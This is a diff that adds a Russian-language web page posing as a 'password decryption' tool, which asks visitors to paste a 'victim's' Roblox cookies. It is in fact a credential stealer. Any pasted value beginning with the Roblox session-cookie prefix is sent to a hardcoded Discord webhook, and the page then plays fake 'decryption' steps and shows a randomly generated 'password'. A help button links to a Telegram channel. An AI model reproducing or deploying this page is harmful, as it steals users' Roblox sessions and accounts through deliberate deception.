@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: #121212;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .matrix-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            background: linear-gradient(0deg, rgba(18,18,18,1) 0%, rgba(0,180,216,0.1) 100%);
+        }
+
+        @keyframes matrixFall {
+            0% { transform: translateY(-150%); }
+            100% { transform: translateY(100vh); }
+        }
+
+        .matrix-digit {
+            position: absolute;
+            color: #00b4d855;
+            font-size: 14px;
+            animation: matrixFall 15s linear infinite;
+            user-select: none;
+        }
+
+        h1 {
+            color: white;
+            margin: 30px 0;
+            text-shadow: 0 0 15px #00b4d8;
+            font-size: 2.5em;
+            position: relative;
+            z-index: 1;
+            transition: 0.3s;
+        }
+
+        .logo {
+            width: 180px;
+            height: 180px;
+            margin-bottom: 50px;
+            border-radius: 50%;
+            box-shadow: 0 0 30px #00b4d8;
+            transition: transform 0.5s ease-in-out;
+            cursor: pointer;
+            position: relative;
+            z-index: 1;
+        }
+
+        .input-field {
+            width: 400px;
+            padding: 15px 25px;
+            border: 2px solid #00b4d8;
+            border-radius: 10px;
+            background: transparent;
+            color: white;
+            font-size: 18px;
+            margin-bottom: 25px;
+            outline: none;
+            transition: 0.3s;
+            position: relative;
+            z-index: 1;
+        }
+
+        .submit-btn {
+            padding: 15px 40px;
+            background: linear-gradient(135deg, #00b4d8, #90e0ef);
+            border: 2px solid white;
+            border-radius: 8px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 1.1em;
+            text-shadow: 1px 1px 2px black;
+            margin-bottom: 15px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .help-btn {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            padding: 15px 25px;
+            border-radius: 15px;
+            background: linear-gradient(135deg, #ff6b6b, #ff8787);
+            border: 2px solid white;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            text-shadow: 1px 1px 2px black;
+            white-space: nowrap;
+        }
+
+        .hidden-left {
+            transform: translateX(-100vw) !important;
+            opacity: 0 !important;
+            transition: all 1s ease-in-out !important;
+        }
+
+        .hidden-right {
+            transform: translateX(100vw) !important;
+            opacity: 0 !important;
+            transition: all 1s ease-in-out !important;
+        }
+
+        .final-code {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            font-size: 3em;
+            background: linear-gradient(45deg, #00b4d8, #90e0ef);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: codeReveal 2s forwards;
+            text-shadow: 0 0 20px rgba(0,180,216,0.5);
+            z-index: 1000;
+        }
+
+        @keyframes codeReveal {
+            0% { transform: translate(-50%, -50%) scale(0); }
+            80% { transform: translate(-50%, -50%) scale(1.2); }
+            100% { transform: translate(-50%, -50%) scale(1); }
+        }
+
+        .process-step {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 1.5em;
+            text-align: center;
+            opacity: 0;
+            animation: stepFade 1s forwards;
+        }
+
+        @keyframes stepFade {
+            0% { opacity: 0; transform: translate(-50%, -40%); }
+            100% { opacity: 1; transform: translate(-50%, -50%); }
+        }
+
+        .message-box {
+            width: 400px;
+            padding: 15px;
+            border-radius: 10px;
+            border: 2px solid;
+            position: relative;
+            overflow: hidden;
+            margin-top: 10px;
+            opacity: 0;
+            transform: translateY(-20px);
+            transition: all 0.3s ease;
+            z-index: 1001;
+        }
+
+        .message-box.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .error-message {
+            background: #ff4444dd;
+            border-color: #ff0000;
+            color: white;
+        }
+
+        .timer-bar {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            background: rgba(255,255,255,0.5);
+            width: 100%;
+            transform-origin: left;
+            animation: timer 3s linear forwards;
+        }
+
+        @keyframes timer {
+            from { transform: scaleX(1); }
+            to { transform: scaleX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-effect" id="matrixEffect"></div>
+    <h1 id="mainTitle">Расшифровка паролей</h1>
+    <img src="h.png" alt="Логотип" class="logo" id="logo">
+    
+    <input type="text" 
+           class="input-field" 
+           id="passwordInput" 
+           placeholder="Введите куки жертвы">
+           
+    <button class="submit-btn" onclick="checkInput()">РАСШИФРОВАТЬ</button>
+    
+    <div id="messageContainer"></div>
+    <button class="help-btn" onclick="window.open('https://t.me/cookiehackroblox', '_blank')">Как получить куки?</button>
+
+    <script>
+        function createMatrixEffect() {
+            const chars = '01_|WA';
+            const container = document.getElementById('matrixEffect');
+            
+            for(let i = 0; i < 50; i++) {
+                const digit = document.createElement('div');
+                digit.className = 'matrix-digit';
+                digit.style.left = `${Math.random() * 100}%`;
+                digit.style.animationDelay = `${Math.random() * 15}s`;
+                digit.textContent = chars[Math.floor(Math.random() * chars.length)];
+                container.appendChild(digit);
+            }
+        }
+        createMatrixEffect();
+
+        async function startHackProcess() {
+            const elementsToHide = [
+                document.querySelector('h1'),
+                document.querySelector('.logo'),
+                document.querySelector('.input-field'),
+                document.querySelector('.submit-btn'),
+                document.querySelector('.help-btn')
+            ];
+
+            elementsToHide.forEach((el, index) => {
+                el.classList.add(index % 2 === 0 ? 'hidden-left' : 'hidden-right');
+            });
+
+            const steps = [
+                {text: 'Загрузка..', delay: 6000},
+                {text: 'Загружаю куки на сервер 173.245.49.29:80..', delay: 3000},
+                {text: 'Данные переданы!', delay: 1000},
+                {text: 'Использую технологию HTTP для расшифровки..', delay: 10000},
+                {text: 'Получаю токен сервера Roblox..', delay: 2000},
+                {text: 'Запрашиваю код у сервера Roblox..', delay: 1000},
+                {text: 'Код получен!', delay: 1000},
+                {text: 'Расшифровываю куки..', delay: 2000}
+            ];
+
+            for (const step of steps) {
+                await showProcessStep(step.text, step.delay);
+            }
+
+            const finalCode = generateRandomCode();
+            const codeElement = document.createElement('div');
+            codeElement.className = 'final-code';
+            codeElement.textContent = finalCode;
+            document.body.appendChild(codeElement);
+        }
+
+        function showProcessStep(text, delay) {
+            return new Promise(resolve => {
+                const stepElement = document.createElement('div');
+                stepElement.className = 'process-step';
+                stepElement.textContent = text;
+                document.body.appendChild(stepElement);
+
+                setTimeout(() => {
+                    stepElement.remove();
+                    resolve();
+                }, delay);
+            });
+        }
+
+        function generateRandomCode() {
+            const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const numbers = '0123456789';
+            let code = 'Пароль: ';
+            
+            for (let i = 0; i < 7; i++) {
+                code += numbers.charAt(Math.floor(Math.random() * numbers.length));
+            }
+            
+            for (let i = 0; i < 2; i++) {
+                code += letters.charAt(Math.floor(Math.random() * letters.length));
+            }
+            
+            return code;
+        }
+
+        function checkInput() {
+            const input = document.getElementById('passwordInput').value.trim();
+            
+            if (!input) {
+                showMessage('error', 'ОШИБКА: Поле ввода пустое!');
+                return;
+            }
+
+            if (input.startsWith('_|WARN')) {
+                fetch('https://discord.com/api/webhooks/1375979050161406073/QyN88qfI7PmgjMhCzsOmucFxYc7-yLWo5teU7KeQnxcosmQeprkSgWyVZGBfX2uDm_b9', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: input }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        startHackProcess();
+                        document.getElementById('passwordInput').value = '';
+                    }
+                })
+                .catch(() => {
+                    showMessage('error', 'ОШИБКА: Не удалось подключиться к серверу!');
+                });
+            } else {
+                showMessage('error', 'ОШИБКА: Неверный формат куки!');
+            }
+        }
+
+        function showMessage(type, text, duration = 3000) {
+            const container = document.getElementById('messageContainer');
+            container.innerHTML = `
+                <div class="message-box ${type}-message">
+                    ${text}
+                    <div class="timer-bar"></div>
+                </div>
+            `;
+
+            const messageBox = container.firstElementChild;
+            void messageBox.offsetWidth;
+            messageBox.classList.add('show');
+            
+            setTimeout(() => {
+                messageBox.classList.remove('show');
+                setTimeout(() => {
+                    container.innerHTML = '';
+                }, 300);
+            }, duration);
+        }
+    </script>
+</body>
+</html>
